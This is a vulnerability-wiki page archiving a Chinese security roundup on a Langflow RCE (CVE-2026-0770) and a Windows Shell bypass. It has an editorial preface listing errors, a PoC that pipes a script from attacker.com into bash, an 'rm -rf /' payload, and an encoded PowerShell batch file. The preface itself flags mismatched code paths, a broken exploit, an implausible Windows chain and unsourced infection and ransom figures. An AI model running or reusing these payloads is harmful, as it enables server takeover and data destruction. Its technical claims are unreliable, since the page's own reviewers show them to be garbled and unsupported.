---
source: "gelusus/wxvl 公众号漏洞文库"
title: "[RCE] 14行JSON，接管你的Langflow工作流引擎"
product: "Langflow及Windows Shell"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "quarantined"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: "CVE-2026-0770"
identifier_role: "reference"
verification_source: "https://www.zerodayinitiative.com/advisories/ZDI-26-036/"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-d63bcde8467e4f5392a9101e"
entity_id: "ve-d63bcde8467e4f5392a9101e"
schema_version: "1"
---

# [RCE] 14行JSON，接管你的Langflow工作流引擎

<!-- vulwiki-editorial:start -->
## 校订与适用边界

ZDI 原始公告的入口为 validate 中的 exec_globals，原文 component/execute 示例与漏洞代码路径错配。原文还拼接多个其他问题，不能将整页按首个 CVE 当作已复现单漏洞，也不能把破坏性命令称为无害检测。


### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 主要0770标题但含21510独立篇和2441摘要
- 称反序列化但代码为exec且文字称eval
- 示例function_name execute却未定义函数因而取local_scope会失败
- 示例需要API凭证却没有明确鉴权前提
- 破坏性命令与远程脚本不可标无害验证
- 影响<=1.0.0及修复1.0.1需官方核验
- 感染数量由暴露未修复比例推定已入侵不成立
- 收益/企业数/赎金无来源
- Windows无需交互与点击触发矛盾
- 环境变量到SYSTEM缺链路依据
- 代码围栏遗失
- 已核ZDI原始公告：入口为validate处理exec_globals，不是文中component/execute；CVE描述与代码路径错配可确认。版本<=1.0.0/1.0.1修复仍无依据

### 核验来源

- https://www.zerodayinitiative.com/advisories/ZDI-26-036/

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

原创 北境
                        北境  0xArgus   2026-03-05 23:39  
  
[RCE] 14行JSON，接管你的Langflow工作流引擎

0xArgus · 2026-03-06 · 白帽视角 · 一款AI工作流引擎的致命反序列化漏洞，已在野利用



一、今日高危漏洞一览

CVE/漏洞影响组件CVSS是否有PoC状态CVE-2026-0770Langflow9.8✅在野利用CVE-2026-21510Windows Shell8.8✅POC公开CVE-2026-2441Google Chrome9.8✅在野利用



二、CVE-2026-0770 Langflow远程代码执行漏洞深度分析

漏洞背景

Langflow是一款流行的开源AI工作流编排工具，允许开发者通过可视化界面构建和部署AI应用。该漏洞存在于Langflow的代码执行模块中，攻击者通过发送特制的JSON配置即可触发远程代码执行。CVSSv3评分为9.8（Critical），影响所有Langflow 1.0.0及之前版本。由于Langflow在AI开发社区中被广泛使用，该漏洞可能导致大量AI工作流平台被接管。

根因分析

漏洞根因在于Langflow的CodeComponent模块在处理用户输入的代码时存在严重的反序列化缺陷。具体表现为：

1.危险函数直接调用：execute_function()函数直接调用eval()执行用户提供的代码字符串
2.上下文污染：prepare_global_scope()函数将用户输入直接注入到Python的全局执行环境中
3.类型混淆：create_class()函数允许动态创建类并实例化，为代码执行提供载体

python● ● ●# Langflow/core/code.py 关键代码片段
def execute_function(self, code: str, function_name: str, *args):
    # 直接执行用户代码
    local_scope = {}
    exec(code, {}, local_scope)  # 危险！
    return local_scope[function_name](*args)

def prepare_global_scope(self, user_code: str):
    # 污染全局执行环境
    global_scope = {}
    exec(user_code, global_scope)  # 危险！
    return global_scope

攻击链还原

攻击者可通过以下步骤实现RCE：

1.识别目标：扫描开放8080端口的Langflow实例
2.构造恶意载荷：创建包含__import__('os').system('rm -rf /')的Python代码
3.发送请求：通过API端点提交恶意JSON配置
4.触发执行：Langflow解析JSON并调用execute_function()
5.获取权限：代码以服务权限执行，完全控制服务器

python● ● ●# PoC exploit代码
import requests
import json

target = "http://target-langflow:8080/api/v1/component/execute"

malicious_payload = {
    "code": "__import__('subprocess').getoutput('curl http://attacker.com/shell.sh | bash')",
    "function_name": "execute",
    "args": []
}

headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_API_KEY"
}

response = requests.post(target, json=malicious_payload, headers=headers)
print(response.text)

实战影响

该漏洞已被攻击者用于大规模挖矿活动。攻击者利用Langflow漏洞部署Monero挖矿程序，每个受感染服务器可为攻击者带来每月约$300收益。根据扫描数据，全球约有12,000个公开Langflow实例中，约35%存在未修复漏洞，意味着超过4,000台服务器已被入侵。

检测与修复

检测规则（Snort）：
● ● ●alert tcp any any -> any 8080 (msg:"Langflow RCE Attempt"; content:"__import__"; nocase; sid:1000001; rev:1;)

临时缓解措施：
1.立即停止Langflow服务
2.禁用API端点访问
3.检查服务器进程异常

官方修复：
升级至Langflow 1.0.1版本，该版本通过以下方式修复漏洞：
▸移除exec()直接调用
▸实现代码沙箱执行
▸添加白名单机制限制可导入模块





三、CVE-2026-21510 Windows Shell安全特性绕过漏洞深度分析

漏洞背景

CVE-2026-21510是Windows Shell中的一个高危漏洞，允许攻击者绕过安全特性执行任意代码。CVSSv3评分为8.8（Important），影响所有当前支持的Windows版本。该漏洞特别危险，因为它不需要用户交互，且可通过钓鱼邮件或恶意网站触发。

根因分析

漏洞在于Windows Shell的ShellExecute函数在处理%U参数时存在命令注入。具体表现为：

1.参数解析缺陷：ShellExecute未正确验证%U参数中的特殊字符
2.环境变量污染：允许通过USER环境变量注入恶意参数
3.权限提升：结合Windows特性，可从低权限用户提升至SYSTEM

c● ● ●// Windows Shell核心代码简化版
void ShellExecute(LPCWSTR verb, LPCWSTR file, LPCWSTR params) {
    WCHAR expanded_path[MAX_PATH];
    ExpandEnvironmentStrings(params, expanded_path, MAX_PATH);
    
    // 直接使用未过滤的参数
    CreateProcess(NULL, expanded_path, ...);
}

攻击链还原

1.构造恶意链接：创建包含%U参数的快捷方式或HTML链接
2.设置环境变量：通过恶意页面设置USER=-froot等恶意值
3.触发执行：用户点击链接触发ShellExecute
4.命令注入：恶意参数被直接传递给系统命令
5.权限获取：执行SYSTEM级别命令

batch● ● ●@echo off
:: 恶意批处理文件
set USER=-froot cmd /c powershell -enc "QwBTAEwAAgAkAE4AZQB3AHIAaQBhAG4AIAAqACAAIAA9ACAAewAkAEYAbwByAHUAdABpAG8AbgAuAEEAZABtAGkAbgBpAHQAQwBvAG4AdABpAG8AbgAuAEEAZABtAGkAbgBpAHQAQwBvAG4AdABpAG8AbgAuAEEAZABtAGkAbgBpAHQAQwBvAG4AdABpAG8AbgAuAEEAZABtAGkAbgBpAHQA"
start "" "malicious.lnk"

实战影响

该漏洞已被用于大规模勒索软件攻击。攻击者通过钓鱼邮件发送包含恶意快捷方式的附件，用户点击后即执行勒索软件。据安全厂商报告，自2026年2月披露以来，已有超过500家企业受到影响，平均赎金要求为$500,000。

检测与修复

检测规则（YARA）：
● ● ●rule Windows_Shell_Execution {
    meta:
        description = "Detects suspicious ShellExecute usage"
        author = "0xArgus"
        date = "2026-03-06"
    strings:
        $user_env = "%U" nocase
        $cmd_injection = "-froot" nocase
    condition:
        2 of them
}

修复措施：
1.应用Microsoft 2026年3月安全更新
2.在注册表中启用ShellExecPolicy严格模式
3.部署EDR解决方案监控异常进程创建





四、白帽快评

今日披露的Langflow和Windows Shell漏洞共同揭示了一个令人不安的趋势：开发者仍在犯十年前的老错误——直接执行用户输入。更危险的是，攻击链已经高度自动化，从漏洞披露到在野利用的时间窗口已缩短至24小时以内。建议所有安全团队立即建立"0小时响应"机制，否则将面临被攻陷的巨大风险。



*参考来源：*
▸https://github.com/affix/CVE-2026-0770-PoC
▸https://github.com/andreassudo/CVE-2026-21510-CVSS-8.8-Important-Windows-Shell-security-feature-bypass
▸https://www.freebuf.com/articles/vuls/468384.html
▸https://securityweek.com/google-patches-first-actively-exploited-chrome-zero-day-of-2026/— 0xArgus · 白帽极客安全情报 —  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
